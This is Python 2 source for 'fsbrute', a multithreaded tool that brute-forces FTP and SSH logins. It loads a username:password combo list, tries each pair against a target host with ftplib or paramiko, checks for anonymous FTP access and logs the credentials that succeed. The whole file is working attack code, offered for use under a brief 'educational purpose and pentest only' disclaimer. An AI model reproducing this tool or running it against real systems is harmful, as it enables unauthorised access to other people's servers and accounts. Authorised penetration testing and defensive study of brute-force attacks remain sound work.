__author__ = 'Fahri Güreşçi'
__version__ = '1.0'

# fsbrute is ftp and ssh login bruter multithread program.
# Copyright (C) (2017)

# fsbrute is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software Foundation,
# Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA

# WARNING
# This was written for educational purpose and pentest only. Use it at your own risk.
# Please remember... your action will be logged in target system...
# Author will not be responsible for any damage !!
# Use it with your own risk

import sys
import time
import os
from ftplib import FTP
try:
  from paramiko import SSHClient,AutoAddPolicy,util
  util.log_to_file("filename.log")
except ImportError:
  print 'Missing Paramiko Dependency.'
  sys.exit(1)
from threading import Thread,Lock
from Queue import Queue

log = "fsbrute"

if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
  SysCls = 'clear'
  for x in range(1,100):
    try:
     check=open(log+"_"+str(x)+".log","r+")
     check.close()
    except IOError:
      break
  file = open(log+"_"+str(x)+".log", "a")
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
  SysCls = 'cls'
  import winpaths
  desktop=winpaths.get_desktop()
  os.system('color 17')
  os.system('mode con: cols=88 lines=19')
  for x in range(1,100):
    try:
     check=open(desktop+"\\"+log+"_"+str(x)+".log","r+")
     check.close()
    except IOError:
      break
  file = open(desktop+"\\"+log+"_"+str(x)+".log", "a")
else:
  SysCls = 'unknown'

face =   '''

                    _____       ___.                    __           
                  _/ ____\______\_ |__ _______  __ __ _/  |_   ____  
                  \   __\/  ___/ | __ \\_  __ \|  |  \\   __\_/ __ \ 
                  |  |  \___ \  | \_\ \|  | \/|  |  / |  |  \  ___/ 
                  |__| /____  > |___  /|__|   |____/  |__|   \___  >
                            \/      \/                           \/ 
        
                by : fahri314



fsbrute.py version 1.0
Brute forcing ftp or ssh target
Programmmer : Fahri Guresci
Edited time : 09-08-2017
fahri314[at]gmail[dot]com
_______________________________________________________________________________________
'''

option = '''
Usage: ./fsbrute.py [options]
Options: -t, --target       <hostname/ip>    |   target to bruteforcing 
         -c, --combolist    <combolist>      |   combolist for bruteforcing
         -h, --help         <help>           |   print this help
         -b, --bot          <bot>            |   bot count
                                                  
Example   : ./fsbrute.py -t 192.168.1.1 -c combolist.txt -b 10 ftp
'''

def MyFace() :
  os.system(SysCls)
  print face
  file.write(face)
  time.sleep(2)

def HelpMe() :
  MyFace()
  print option
  print "\nYour arguman count: ",len(sys.argv)
  sys.exit(1)

for arg in sys.argv:
  if arg.lower() == '-t' or arg.lower() == '--target':
    hostname = sys.argv[int(sys.argv[1:].index(arg))+2]
  elif arg.lower() == '-c' or arg.lower() == '--combolist':
    combolist = sys.argv[int(sys.argv[1:].index(arg))+2]
  elif arg.lower() == '-b' or arg.lower() == '--bot':
    bot = int(sys.argv[int(sys.argv[1:].index(arg))+2])
  elif len(sys.argv) != 8:
    HelpMe()

btype=sys.argv[7]

def checkanony() :
  try:
    print "\n[+] Checking for anonymous login\n"
    ftp = FTP(hostname)
    ftp.login()
    ftp.retrlines('LIST') #bulundugumuz dizindeki dosya ve dizinleri listele
    print "\n[!] Anonymous login successfuly !\n"
    ftp.quit()
  except Exception, e:
    print "\n[-] Anonymous login unsuccessful...\n"
    time.sleep(1)
  pass

def BruteForce(username,password) :
  if btype == "ftp":
    try:
      ftp = FTP(hostname)
      ftp.login(username, password)
      ftp.retrlines('list')
      ftp.quit()
      return 1
    except Exception, e:
      #print "[-] Failed"
      return 0
      pass
    except KeyboardInterrupt:
      print "\n[-] Aborting...\n"
      file.write("\n[-] Aborting...\n")
      sys.exit(1)
      return 0
  elif btype == "ssh":
    try:
      ssh = SSHClient()
      ssh.set_missing_host_key_policy(AutoAddPolicy())
      ssh.connect(hostname, username = username, password = password)
      ssh.close()
      return 1
    except Exception, e:
      return 0
    except KeyboardInterrupt:
      print "\n[-] Aborting...\n"
      file.write("\n[-] Aborting...\n")
      sys.exit(1)
      return 0

MyFace()
os.system(SysCls)
if sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
  os.system('mode con: cols=80 lines=15')

if(combolist.find(".txt")==-1):
    combolist=combolist+".txt"
os.system(SysCls)

print "[!] Starting attack at %s" % time.strftime("%X")
print "[!] System Activated for brute forcing..."
print "[!] Please wait until brute forcing finish !\n"
if btype == "ftp":
  checkanony()

os.system(SysCls)

try:
  preventstrokes = open(combolist, "r")
  combos         = preventstrokes.readlines()
  count          = 0
  while count < len(combos):
    combos[count] = combos[count].strip()
    count += 1
except(IOError): 
  print "\n[-] Error: Check your combolist path\n"
  file.write("\n[-] Error: Check your combolist path\n")
  raw_input("\nPress any key to continue...")
  sys.exit(1)

q_list = Queue()
lock = Lock()

print "\n[+] Loaded:",len(combos),"combos"
print "[+] BruteForcing...\n"
time.sleep(3)
os.system(SysCls)
success = 0
process = 0

def make_this(q_list) :
  os.system(SysCls)
  global success
  global process
  for i in range(0,len(combos)):
    cmb = q_list.get()
    if(cmb.find(":")!=-1):
      line=cmb.split(':')
      user=line[0]
      password=line[1]
    else:
      continue
    rtn= BruteForce(user.replace("\n",""),password.replace("\n",""))
    if(rtn==1):
      file.write("%s\n" % (cmb))
      lock.acquire()
      success=success+1
      lock.release()
    lock.acquire()
    process = process + 1
    lock.release()
    print "\033[5;4H[!] Process\t\t: %s" % (process)
    print "\n\033[6;4H[+] Login Success\t: %s" % success
    q_list.task_done()
  os.system(SysCls)

for cmb in combos:
  q_list.put(cmb)

for i in range(bot):
  t = Thread(target = make_this, args = (q_list,))
  t.daemon = True
  t.start()

q_list.join()

if sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
  print "\033[8;4H[+] result: Succesfull operation. \033[9;4H[+] Created file : '",desktop+"\\"+log+"_"+str(x)+".log '"
else:
  print "\033[8;4H[+] result: Succesfull operation. \033[9;4H[+] Created file : '",log+"_"+str(x)+".log '"

file.close()

raw_input("\033[11;4H[!] Press any key to continue...")